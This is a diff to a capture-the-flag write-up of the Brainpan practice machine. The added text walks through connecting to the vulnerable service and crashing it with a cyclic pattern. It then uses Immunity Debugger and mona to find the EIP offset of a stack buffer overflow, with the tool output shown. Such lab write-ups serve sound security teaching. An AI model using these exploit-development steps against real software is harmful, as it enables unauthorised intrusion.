@@ -264,7 +264,7 @@ There's a bug in the strcpy function call because it doesn't specify the amount 
 I'll run the binary 
 ![image](https://user-images.githubusercontent.com/113513376/220007694-eb247e85-d35d-4fe6-8c1f-36c77ac19995.png)
 
-So we opens up a port and the service is running on port 9999
+So it opens up a port and the service is running on port 9999
 
 I can confirm by scanning it from my linux box
 
@@ -284,4 +284,99 @@ Nmap done: 1 IP address (1 host up) scanned in 30.77 seconds
 I'll connect to the service using netcat
 
 ```
+└─$ nc windowpc.local 9999 
+_|                            _|                                        
+_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
+_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
+                                            _|                          
+                                            _|
+
+[________________________ WELCOME TO BRAINPAN _________________________]
+                          ENTER THE PASSWORD                              
+
+                          >> shitstorm
+                          ACCESS GRANTED                                                                                                        
+┌──(mark㉿haxor)-[~/Desktop/B2B/THM/Brainpan]
+└─$ 
+```
+
+We see it worked as expected and we got access granted since we gave the correct value
+
+But this isn't what we want to do. We know that DEP is disabled meaning we can inject shellcode to the stack and execute it 
+
+And since there's buffer overflow we can achieve this 
+
+I'll run the binary again but this time around attach it to a debugger (as admin) in this case `Immunity Debugger`
+![image](https://user-images.githubusercontent.com/113513376/220010047-07a6a4e0-8b0e-4701-9831-327d7c8b3643.png)
+
+Now its going to be paused by default so i'll start the process `F9`
+![image](https://user-images.githubusercontent.com/113513376/220010244-ca886b01-9298-4265-b8d8-b1b7cacfd138.png)
+
+I'll set a working directory for mona to use `Mona is a python plugin used to automate and speed up specific searches while developing exploits (typically for the Windows platform)`
+![image](https://user-images.githubusercontent.com/113513376/220011000-103ca470-5e6e-488b-9669-1d6475dc1cb5.png)
+
+```
+!mona config -set workingfolder c:\mona\%p
+```
+
+With this set i'll need to crash the server by giving it values that will overflow the reply buffer which is suppose to only hold up to 520 bytes of data
+
+Using msf-patten_create i'll generate bytes of data
+
+```
+└─$ msf-pattern_create -l 600                       
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9     
+
+```
+
+On connecting to the remote server i'll give the value msf-pattern_create created to the remote service
+![image](https://user-images.githubusercontent.com/113513376/220011739-70d7b0c8-c3e3-4e9c-8756-05f359d7b69b.png)
+
+It hangs but back on the debugger we see it has crashed
+![image](https://user-images.githubusercontent.com/113513376/220011797-a6bc664c-74bd-4270-94b1-1831fed43d24.png)
+
+To get the offset i'll use mona to find the offset at where the eip `instruction pointer` tried accessing a wrong memory address
+![image](https://user-images.githubusercontent.com/113513376/220012023-d1d95aae-68c9-4d22-83d6-e89315ac986c.png)
+
+```
+!mona findmsp distance 600
+```
+
+And from the result we see the EIP crashes at offset 524
+
+```
+[+] Looking for cyclic pattern in memory
+    Cyclic pattern (normal) found at 0x0022f720 (length 600 bytes)
+    Cyclic pattern (normal) found at 0x0022fb50 (length 600 bytes)
+    -  Stack pivot between 544 & 1144 bytes needed to land in this pattern
+    EIP contains normal pattern : 0x35724134 (offset 524)
+    ESP (0x0022f930) points at offset 528 in normal pattern (length 72)
+    EBP contains normal pattern : 0x72413372 (offset 520)
+    EDX (0x0022f720) points at offset 0 in normal pattern (length 600)
+[+] Examining SEH chain
+[+] Examining stack (entire stack) - looking for cyclic pattern
+    Walking stack from 0x0022d000 to 0x0022fffc (0x00002ffc bytes)
+    0x0022f108 : Contains normal cyclic pattern at ESP-0x828 (-2088) : offset 23, length 577 (-> 0x0022f348 : ESP-0x5e7)
+    0x0022f720 : Contains normal cyclic pattern at ESP-0x210 (-528) : offset 0, length 600 (-> 0x0022f977 : ESP+0x48)
+    0x0022fb50 : Contains normal cyclic pattern at ESP+0x220 (+544) : offset 0, length 600 (-> 0x0022fda7 : ESP+0x478)
+[+] Examining stack (entire stack) - looking for pointers to cyclic pattern
+    Walking stack from 0x0022d000 to 0x0022fffc (0x00002ffc bytes)
+    0x0022eb60 : Pointer into normal cyclic pattern at ESP-0xdd0 (-3536) : 0x0022f1b8 : offset 199, length 401
+    0x0022ee98 : Pointer into normal cyclic pattern at ESP-0xa98 (-2712) : 0x0022f2c4 : offset 467, length 133
+    0x0022f0dc : Pointer into normal cyclic pattern at ESP-0x854 (-2132) : 0x004d22b7 : offset 22, length 578
+    0x0022f3cc : Pointer into normal cyclic pattern at ESP-0x564 (-1380) : 0x0022f314 : offset 547, length 53
+    0x0022f5e4 : Pointer into normal cyclic pattern at ESP-0x34c (-844) : 0x0022f874 : offset 340, length 260
+    0x0022f608 : Pointer into normal cyclic pattern at ESP-0x328 (-808) : 0x0022f8c8 : offset 424, length 176
+    0x0022f710 : Pointer into normal cyclic pattern at ESP-0x220 (-544) : 0x0022f720 : offset 0, length 600
+    0x0022fa80 : Pointer into normal cyclic pattern at ESP+0x150 (+336) : 0x0022fb6c : offset 28, length 572
+    0x0022fa8c : Pointer into normal cyclic pattern at ESP+0x15c (+348) : 0x0022fb68 : offset 24, length 576
+    0x0022fb2c : Pointer into normal cyclic pattern at ESP+0x1fc (+508) : 0x0022fc24 : offset 212, length 388
+```
+
+
+
+
+
 
